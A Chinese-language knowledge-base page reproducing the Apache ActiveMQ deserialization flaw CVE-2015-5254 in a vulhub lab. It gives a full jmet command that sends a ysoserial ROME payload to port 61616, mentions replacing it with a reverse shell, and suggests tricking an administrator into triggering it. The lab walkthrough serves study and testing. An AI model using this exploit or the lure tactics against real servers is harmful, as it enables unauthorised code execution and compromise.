<h1 id="&#xFF08;cve-2015-5254&#xFF09;activemq-&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;">&#xFF08;CVE-2015-5254&#xFF09;ActiveMQ &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;</h1>
<h2 id="&#x4E00;&#x3001;&#x6F0F;&#x6D1E;&#x7B80;&#x4ECB;">&#x4E00;&#x3001;&#x6F0F;&#x6D1E;&#x7B80;&#x4ECB;</h2>
<p>Apache ActiveMQ 5.13.0&#x4E4B;&#x524D;5.x&#x7248;&#x672C;&#x4E2D;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#xFF0C;&#x8BE5;&#x6F0F;&#x6D1E;&#x6E90;&#x4E8E;&#x7A0B;&#x5E8F;&#x6CA1;&#x6709;&#x9650;&#x5236;&#x53EF;&#x5728;&#x4EE3;&#x7406;&#x4E2D;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7C7B;&#x3002;&#x8FDC;&#x7A0B;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x501F;&#x52A9;&#x7279;&#x5236;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x7684;Java Message Service(JMS)ObjectMessage&#x5BF9;&#x8C61;&#x5229;&#x7528;&#x8BE5;&#x6F0F;&#x6D1E;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x3002;</p>
<h2 id="&#x4E8C;&#x3001;&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;">&#x4E8C;&#x3001;&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;</h2>
<p>Apache ActiveMQ 5.13.0&#x4E4B;&#x524D;&#x7684;5.x&#x7248;&#x672C;</p>
<h2 id="&#x4E09;&#x3001;&#x590D;&#x73B0;&#x8FC7;&#x7A0B;">&#x4E09;&#x3001;&#x590D;&#x73B0;&#x8FC7;&#x7A0B;</h2>
<p>&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>
<ol>
<li>&#x6784;&#x9020;&#xFF08;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ysoserial&#xFF09;&#x53EF;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;</li>
<li>&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x6D88;&#x606F;&#xFF0C;&#x53D1;&#x9001;&#x7ED9;&#x76EE;&#x6807;61616&#x7AEF;&#x53E3;</li>
<li>&#x8BBF;&#x95EE;web&#x7BA1;&#x7406;&#x9875;&#x9762;&#xFF0C;&#x8BFB;&#x53D6;&#x6D88;&#x606F;&#xFF0C;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;</li>
</ol>
<p>&#x4F7F;&#x7528;<a href="https://github.com/ianxtianxt/jmet" target="_blank">jmet</a>&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x3002;&#x9996;&#x5148;&#x4E0B;&#x8F7D;jmet&#x7684;jar&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x5728;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;external&#x6587;&#x4EF6;&#x5939;&#xFF08;&#x5426;&#x5219;&#x53EF;&#x80FD;&#x4F1A;&#x7206;&#x6587;&#x4EF6;&#x5939;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x9519;&#x8BEF;&#xFF09;&#x3002;</p>
<p>jmet&#x539F;&#x7406;&#x662F;&#x4F7F;&#x7528;ysoserial&#x751F;&#x6210;Payload&#x5E76;&#x53D1;&#x9001;&#xFF08;&#x5176;jar&#x5185;&#x81EA;&#x5E26;ysoserial&#xFF0C;&#x65E0;&#x9700;&#x518D;&#x81EA;&#x5DF1;&#x4E0B;&#x8F7D;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728;ysoserial&#x662F;gadget&#x4E2D;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#xFF0C;&#x6BD4;&#x5982;ROME&#x3002;</p>
<p>&#x6267;&#x884C;&#xFF1A;</p>
<pre class="language-"><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616
</code></pre><p><img src="img/5.png" alt="image"></p>
<p>&#x6B64;&#x65F6;&#x4F1A;&#x7ED9;&#x76EE;&#x6807;ActiveMQ&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;event&#x7684;&#x961F;&#x5217;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x961F;&#x5217;&#x4E2D;&#x6240;&#x6709;&#x6D88;&#x606F;&#xFF1A;</p>
<p><img src="img/6.png" alt="image"></p>
<p>&#x70B9;&#x51FB;&#x67E5;&#x770B;&#x8FD9;&#x6761;&#x6D88;&#x606F;&#x5373;&#x53EF;&#x89E6;&#x53D1;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x6B64;&#x65F6;&#x8FDB;&#x5165;&#x5BB9;&#x5668;<code>docker-compose exec activemq bash</code>&#xFF0C;&#x53EF;&#x89C1;/tmp/success&#x5DF2;&#x6210;&#x529F;&#x521B;&#x5EFA;&#xFF0C;&#x8BF4;&#x660E;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6210;&#x529F;&#xFF1A;</p>
<p><img src="img/7.png" alt="image"></p>
<p>&#x5C06;&#x547D;&#x4EE4;&#x66FF;&#x6362;&#x6210;&#x5F39;shell&#x8BED;&#x53E5;&#x518D;&#x5229;&#x7528;&#xFF1A;</p>
<p><img src="img/8.png" alt="image"></p>
<p>&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x901A;&#x8FC7;web&#x7BA1;&#x7406;&#x9875;&#x9762;&#x8BBF;&#x95EE;&#x6D88;&#x606F;&#x5E76;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x9700;&#x8981;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#x3002;&#x5728;&#x6CA1;&#x6709;&#x5BC6;&#x7801;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BF1;&#x5BFC;&#x7BA1;&#x7406;&#x5458;&#x8BBF;&#x95EE;&#x6211;&#x4EEC;&#x7684;&#x94FE;&#x63A5;&#x4EE5;&#x89E6;&#x53D1;&#xFF0C;&#x6216;&#x8005;&#x4F2A;&#x88C5;&#x6210;&#x5176;&#x4ED6;&#x5408;&#x6CD5;&#x670D;&#x52A1;&#x9700;&#x8981;&#x7684;&#x6D88;&#x606F;&#xFF0C;&#x7B49;&#x5F85;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;&#x7684;&#x65F6;&#x5019;&#x89E6;&#x53D1;&#x3002;</p>
<h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;">&#x53C2;&#x8003;&#x94FE;&#x63A5;</h2>
<blockquote>
<p><a href="https://vulhub.org/#/environments/activemq/CVE-2015-5254/" target="_blank">https://vulhub.org/#/environments/activemq/CVE-2015-5254/</a> </p>
</blockquote>
<footer class="page-footer"><span class="copyright">&#x96F6;&#x7EC4;&#x8D44;&#x6599;&#x6587;&#x5E93; all right reserved&#xFF0C;powered by 0-sec.org</span><span class="footer-modification">&#x672A;&#x7ECF;&#x6388;&#x6743;&#x7981;&#x6B62;&#x8F6C;&#x8F7D;
2020-02-24 21:13:42
</span></footer>
<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>